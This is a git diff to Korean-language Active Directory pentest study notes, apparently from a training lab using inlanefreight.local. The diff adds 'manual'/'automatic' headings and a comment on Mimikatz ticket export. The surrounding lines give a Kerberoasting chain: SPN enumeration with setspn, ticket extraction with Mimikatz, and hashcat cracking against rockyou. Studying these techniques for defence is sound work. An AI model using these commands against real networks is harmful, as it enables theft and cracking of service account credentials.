@@ -423,6 +423,8 @@ Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Pr
 <br/><br/>
 ## 12. Kerberoasting - from Windows
 
+### 수동 방법
+
 ### setspn.exe로 SPN 열거
 ```setspn.exe -Q */*```
 
@@ -437,7 +439,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 ### Mimikatz를 사용하여 메모리에서 티켓 추출
 ```
-mimikatz # base64 /out:true
+mimikatz # base64 /out:true    <== 이 명령 생략하면 kirbi 파일 바로 저장 
 mimikatz # kerberos::list /export
 ```
 
@@ -455,6 +457,8 @@ mimikatz # kerberos::list /export
 
 ### Hashcat으로 Cracking
 ```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```
+
+### 자동 방법
 
 ### TGS Tickets 추출을 위한 PowerView 사용
 ```
